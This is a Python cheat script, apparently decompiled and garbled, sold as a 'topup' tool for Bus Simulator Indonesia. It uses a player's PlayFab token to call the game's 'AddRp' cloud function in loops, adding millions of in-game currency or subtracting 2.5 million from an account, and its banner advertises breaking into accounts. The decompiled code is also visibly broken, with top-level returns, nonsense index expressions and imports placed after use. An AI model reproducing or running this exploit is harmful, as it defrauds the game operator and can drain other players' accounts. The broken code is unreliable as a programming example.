print(f'''{green}║ {yellow}██{white}║{yellow}██{white}╔══{yellow}██{white}╗ {green}NOTE   : SUBSCRIBE MY CHANNEL NIJAM 34R!!''')
print(f'''{green}║ {yellow}██{white}║{yellow}██{white}║ {yellow} ██{white}║ {green}CATATAN: SUBSCRIBE CHANNEL SAYA/GW NIJAM 34R!!''')
print(f'''{green}║ {yellow}██{white}║{yellow}██{white}║  {yellow}██{white}║ {green}AUTHOR : AKIO ASAKURA AKA NIJAMR34''')
print(f'''{green}║ {yellow}██{white}║{yellow}██████{white}╔╝''')
print(f'''{green}║ {white}╚═╝╚═════╝ \x1b[1;33;41m • \x1b[1;37[PROJECT SCRIPT BY NIJAM 34R!\x1b[1;33m • \x1b[0m\x1b[ ''')
print(f'''{green}╠{yellow}═══════════════════════════════════════════════════════════════════''')
print(f'''{green}║   \x1b[0;31mBULAN: \x1b[0;32m{kal:%B}   \x1b[0;31mHARI: \x1b[0;32m{kal:%A}     \x1b[0;31mTANGGAL: \x1b[0;32m{kal:%d}     \x1b[0;31mTAHUN: \x1b[0;32m{kal:%Y}''')
print(f'''{green}╠{yellow}═══════════════════════════════════════════════════════════════════''')
print(f'''{green}║ - {yellow}𝐒𝐂𝐑𝚰𝐏𝐓 𝐓𝐎𝐏𝐔𝐏 𝐔𝐋𝐓𝚰𝐌𝐀𝐃𝐄 𝐁𝐘 𝐍𝚰𝐉𝐀𝐌 34𝐑   {green} - 𝚈𝙾𝚄𝚃𝚄𝙱𝙴 : 𝙽𝙸𝙹𝙰𝙼 𝚃𝙸𝙶𝙰 𝙴𝙼𝙿𝙰𝚃 𝚁!!''')
print(f'''{green}║ - {red}SCRIPT TOPUP FOR: {red}BUS SIMUL{white}ATOR INDONESIA ALL VERSION!''')
print(f'''{green}╚══════════════════════════════════════════════════════════════════════════╝''')
print('\x1b[94m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬')
print(f'''{green} KEUNTUNGAN:''')
print(f'''''')
print(f'''{yellow} 1. JEBOL AKUN LAST ({red}AKUN YG G BISA DI ISI KAN HRUS DI RESET ,{yellow}JEBOLL!!{yellow})''')
print(f'''''')
print(f'''{yellow} 2. BISA CUSTOM NOMINAL DAN BIKIN ANGKA YANG CANTIKKK! ''')
print(f'''''')
print(f'''{yellow} 3. SUDAH SERBA OTOMATIS, JIKA ADA YANG BLM TERINSTALL/SALAH, ''')
print(f'''{yellow}    BISA LANGSUNG MENGULANG/ MENGINSTALL LAGI!''')
print('\x1b[94m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬')
print(f'''''')

def ketik(c):
    for e in c + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        sleep(0)
        return None

headers = {
    'User-Agent': 'UnityPlayer/2021.3.8f1 (UnityWebRequest/1.0, libcurl/7.80.0-DEV)',
    'Accept-Encoding': 'deflate, gzip',
    'Content-Type': 'application/json',
    'X-ReportErrorAsSuccess': 'true',
    'X-PlayFabSDK': 'UnitySDK-2.135.220509',
    'X-Authorization': hh,
    'X-Unity-Version': '2021.3.8f1' }

def warning():
    ketik(f'''\t{red}GAGAL! {white}JIKA BELUM PAHAM, TNYKN K KNTOR POLISI WKWK''')
    exit(f'''\t{yellow}[X] {red}DATA AKUN BUSSID ANDA GAGAL DIMUAT!''')
    ketik(f'''''')
    sys.exit()


def mxx():
    data = json.dumps({
        'PlayFabId': None,
        'InfoRequestParameters': {
            'GetUserAccountInfo': True,
            'GetUserInventory': True,
            'GetUserVirtualCurrency': True,
            'GetUserData': False,
            'UserDataKeys': None,
            'GetUserReadOnlyData': True,
            'UserReadOnlyDataKeys': None,
            'GetCharacterInventories': False,
            'GetCharacterList': False,
            'GetTitleData': True,
            'TitleDataKeys': None,
            'GetPlayerStatistics': False,
            'PlayerStatisticNames': None } })
    response = requests.post('https://4ae9.playfabapi.com/Client/GetPlayerCombinedInfo', headers = headers, data = data).text
    if response != '':
        parser = json.loads(response)
        if parser['code'] == 401:
            warning()
            return None
        if parser['code'] == 200:
            backend_data = parser['data']
            if 'apiError' in str(backend_data):
                return None
            waktu = time.strftime('%H:%M:%S')
            chat = backend_data['InfoResultPayload']
            uang = chat['UserVirtualCurrency']
            money = uang['RP']
            fff = chat['AccountInfo']
            zzz = fff['TitleInfo']
            www = zzz['TitlePlayerAccount']
            saa = www['Id']
            gcc = chat['AccountInfo']
            id = gcc['TitleInfo']
            you = id['DisplayName']
            ketik(f'''\t    {green}╔═══════════════\x1b[1;33;41m • \x1b[1;37[ 𝙸𝙽𝙵𝙾 𝙰𝙺𝚄𝙽 \x1b[1;33m• \x1b[0m\x1b[{yellow}═════════════════╗''')
            ketik(f'''\t    {green}  {white}- Total Pitis  : {green}{money}       \t  ''')
            ketik(f'''\t    {green}  {white}- NAMA BUSSID  : {green}{you}\t\t ''')
            ketik(f'''\t    {green}  {white}- Id Kau       : {green}{saa}        ''')
            ketik(f'''            {green}  {white}- Jam Before   : [{white}{waktu}]''')
            ketik(f'''\t    {yellow}╚══════════════════════ {red}- {green}═══════════════════════╝''')
            ketik(f'''''')
            ketik('\x1b[92m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬')
            ketik(f'''''')
            return None
        return None

mxx()

def pilih():
    print(f'''''')
    print(f'''{red}1.{white}TOPUP UANG BUSSID UP TO 7 JUTA''')
    print(f'''{red}2.{white}KURAS PENIPU 2,5 JUTA''')
    print(f'''{red}3.{white}EXIT''')
    print(f'''''')

pilih()

def ketik(c):
    for e in c + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        sleep(0)
        return None


def mxxxx():
    data = json.dumps({
        'PlayFabId': None,
        'InfoRequestParameters': {
            'GetUserAccountInfo': True,
            'GetUserInventory': True,
            'GetUserVirtualCurrency': True,
            'GetUserData': False,
            'UserDataKeys': None,
            'GetUserReadOnlyData': True,
            'UserReadOnlyDataKeys': None,
            'GetCharacterInventories': False,
            'GetCharacterList': False,
            'GetTitleData': True,
            'TitleDataKeys': None,
            'GetPlayerStatistics': False,
            'PlayerStatisticNames': None } })
    response = requests.post('https://4ae9.playfabapi.com/Client/GetPlayerCombinedInfo', headers = headers, data = data).text
    if response != '':
        parser = json.loads(response)
        if parser['code'] == 401:
            return None
        if parser['code'] == 200:
            backend_data = parser['data']
            if 'apiError' in str(backend_data):
                return None
            waktu = time.strftime('%H:%M:%S')
            chat = backend_data['InfoResultPayload']
            uang = chat['UserVirtualCurrency']
            money = uang['RP']
            fff = chat['AccountInfo']
            zzz = fff['TitleInfo']
            www = zzz['TitlePlayerAccount']
            saa = www['Id']
            gcc = chat['AccountInfo']
            id = gcc['TitleInfo']
            you = id['DisplayName']
            ketik(f'''           {red} ╔═══{yellow}═══════════\x1b[1;33;41m • \x1b[1;37[ 𝙸𝙽𝙵𝙾 𝙽𝚄𝚈𝙾𝙻 \x1b[1;33m• \x1b[0m\x1b[{yellow}══════════════{red}═══╗''')
            ketik(f'''           {white}   - Total Nuyol: {green}{money}''')
            ketik(f'''           {white}   - Nama BUSSID: {yellow}{you}''')
            ketik(f'''           {white}   - Id Kau     : {red}{saa}''')
            ketik(f'''           {white}   - Jam Selesai: [{white}{waktu}]''')
            ketik(f'''           {red} ╚═══{yellow}═════════════════{green}══ {white}- {green}══{yellow}══════════════════{red}═══╝''')
            return None
        return None


def print(c):
    for e in c + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        sleep(0)
        return None

headers = {
    'User-Agent': 'UnityPlayer/2021.3.8f1 (UnityWebRequest/1.0, libcurl/7.80.0-DEV)',
    'Accept-Encoding': 'deflate, gzip',
    'Content-Type': 'application/json',
    'X-ReportErrorAsSuccess': 'true',
    'X-PlayFabSDK': 'UnitySDK-2.135.220509',
    'X-Authorization': hh,
    'X-Unity-Version': '2021.3.8f1' }

def bungul():
    for k in range(beleng):
        data = json.dumps({
            'CustomTags': None,
            'FunctionName': 'AddRp',
            'FunctionParameter': {
                'addValue': 7000000 },
            'GeneratePlayStreamEvent': False,
            'RevisionSelection': 'Live',
            'SpecificRevision': None,
            'AuthenticationContext': None })
        headers = {
            'User-Agent': 'UnityPlayer/2021.3.8f1 (UnityWebRequest/1.0, libcurl/7.80.0-DEV)',
            'Accept-Encoding': 'deflate, gzip',
            'Content-Type': 'application/json',
            'X-ReportErrorAsSuccess': 'true',
            'X-PlayFabSDK': 'UnitySDK-2.135.220509',
            'X-Authorization': hh,
            'X-Unity-Version': '2021.3.8f1' }
        kingtheend = requests.post('https://4ae9.playfabapi.com/Client/ExecuteCloudScript', headers = headers, data = data).text
        mxxxx()
        print(f'''''')
        return None


def matiajh():
    for k in range(ripper):
        data = json.dumps({
            'CustomTags': None,
            'FunctionName': 'AddRp',
            'FunctionParameter': {
                'addValue': -2500000 },
            'GeneratePlayStreamEvent': False,
            'RevisionSelection': 'Live',
            'SpecificRevision': None,
            'AuthenticationContext': None })
        headers = {
            'User-Agent': 'UnityPlayer/2021.3.8f1 (UnityWebRequest/1.0, libcurl/7.80.0-DEV)',
            'Accept-Encoding': 'deflate, gzip',
            'Content-Type': 'application/json',
            'X-ReportErrorAsSuccess': 'true',
            'X-PlayFabSDK': 'UnitySDK-2.135.220509',
            'X-Authorization': hh,
            'X-Unity-Version': '2021.3.8f1' }
        kingtheend = requests.post('https://4ae9.playfabapi.com/Client/ExecuteCloudScript', headers = headers, data = data).text
        mxxxx()
        print(f'''''')
        return None

emak = input('PILIH ANGKANYA SALAH SATU:')
print(f'''''')
if emak == '1':
    beleng = int(input(f'''MASUKIN JUMLAH TOPUP: {green}'''))
    bungul()
    return None
if emak == '2':
    ripper = int(input(f'''SEDOT PENIPU JUMLAH: {green}'''))
    matiajh()
    return None
if emak == '3':
    sys.exit()
    return None
return None
if ModuleNotFoundError:
    [][f'''{green}''']['║ '][f'''{yellow}''']['███████'][f'''{white}''']['║'][f'''{yellow}''']['██'][f'''{white}''']['║'][f'''{yellow}''']['██'][f'''{white}''']['║ ╚═╝ '][f'''{yellow}''']['██'][f'''{white}''']['║╚'][f'''{yellow}''']['██████'][f'''{white}''']['╔╝'][f'''{yellow}''']['███████'][f'''{white}''']['╗'][f'''{yellow}''']['██'][f'''{white}''']['║  '][f'''{yellow}''']['██'][f'''{white}''']['║   '][f'''{yellow}''']['██'][f'''{white}''']['║   '][f'''{white}''']['╚'][f'''{yellow}''']['██████'][f'''{white}''']['╔╝'][f'''{yellow}''']['██'][f'''{white}''']['║  '][f'''{yellow}''']
    os.system('pip3.11 install requests')
import requests
if ModuleNotFoundError:
    [][f'''{green}''']['║ '][f'''{yellow}''']['███████'][f'''{white}''']['║'][f'''{yellow}''']['██'][f'''{white}''']['║'][f'''{yellow}''']['██'][f'''{white}''']['║ ╚═╝ '][f'''{yellow}''']['██'][f'''{white}''']['║╚'][f'''{yellow}''']['██████'][f'''{white}''']['╔╝'][f'''{yellow}''']['███████'][f'''{white}''']['╗'][f'''{yellow}''']['██'][f'''{white}''']['║  '][f'''{yellow}''']['██'][f'''{white}''']['║   '][f'''{yellow}''']['██'][f'''{white}''']['║   '][f'''{white}''']['╚'][f'''{yellow}''']['██████'][f'''{white}''']['╔╝'][f'''{yellow}''']['██'][f'''{white}''']['║  ']
    os.system('pip3.11 install bs4')
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
if ModuleNotFoundError:
    [][f'''{green}''']['║ '][f'''{yellow}''']['███████'][f'''{white}''']['║'][f'''{yellow}''']['██'][f'''{white}''']['║'][f'''{yellow}''']['██'][f'''{white}''']['║ ╚═╝ '][f'''{yellow}''']['██'][f'''{white}''']['║╚'][f'''{yellow}''']['██████'][f'''{white}''']['╔╝'][f'''{yellow}''']['███████'][f'''{white}''']['╗'][f'''{yellow}''']['██'][f'''{white}''']['║  '][f'''{yellow}''']['██'][f'''{white}''']['║   '][f'''{yellow}''']['██'][f'''{white}''']['║   '][f'''{white}''']['╚'][f'''{yellow}''']['██████'][f'''{white}''']['╔╝'][f'''{yellow}''']['██'][f'''{white}''']
    os.system('pip3.11 install colorama \npip3.11 install pyfiglet\npip3.11 install pystyle\n')
from colorama import Fore, init
if ModuleNotFoundError:
    [][f'''{green}''']['║ '][f'''{yellow}''']['███████'][f'''{white}''']['║'][f'''{yellow}''']['██'][f'''{white}''']['║'][f'''{yellow}''']['██'][f'''{white}''']['║ ╚═╝ '][f'''{yellow}''']['██'][f'''{white}''']['║╚'][f'''{yellow}''']['██████'][f'''{white}''']['╔╝'][f'''{yellow}''']['███████'][f'''{white}''']['╗'][f'''{yellow}''']['██'][f'''{white}''']['║  '][f'''{yellow}''']['██'][f'''{white}''']['║   '][f'''{yellow}''']['██'][f'''{white}''']['║   '][f'''{white}''']['╚'][f'''{yellow}''']['██████'][f'''{white}''']['╔╝'][f'''{yellow}''']['██']
    os.system('pip3.11 install rich')
import rich
from rich.table import Table as me
from rich.console import Console as sol
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
if requests.exceptions.RequestException:
    [][f'''{green}''']['║ '][f'''{yellow}''']['███████'][f'''{white}''']['║'][f'''{yellow}''']['██'][f'''{white}''']['║'][f'''{yellow}''']['██'][f'''{white}''']['║ ╚═╝ '][f'''{yellow}''']['██'][f'''{white}''']['║╚'][f'''{yellow}''']['██████'][f'''{white}''']['╔╝'][f'''{yellow}''']['███████'][f'''{white}''']['╗'][f'''{yellow}''']['██'][f'''{white}''']['║  '][f'''{yellow}''']['██'][f'''{white}''']['║   '][f'''{yellow}''']['██'][f'''{white}''']['║   '][f'''{white}''']['╚'][f'''{yellow}''']['██████'][f'''{white}''']['╔╝'][f'''{yellow}''']
    exit(f'''{p}[{y}!{p}] {r}Internet mu mana kocak!{a}''')
if FileExistsError:
    [][f'''{green}''']['║ '][f'''{yellow}''']['███████'][f'''{white}''']['║'][f'''{yellow}''']['██'][f'''{white}''']['║'][f'''{yellow}''']['██'][f'''{white}''']['║ ╚═╝ '][f'''{yellow}''']['██'][f'''{white}''']['║╚'][f'''{yellow}''']['██████'][f'''{white}''']['╔╝'][f'''{yellow}''']['███████'][f'''{white}''']['╗'][f'''{yellow}''']['██'][f'''{white}''']['║  '][f'''{yellow}''']['██'][f'''{white}''']['║   '][f'''{yellow}''']['██'][f'''{white}''']['║   '][f'''{white}''']['╚'][f'''{yellow}''']['██████'][f'''{white}''']['╔╝']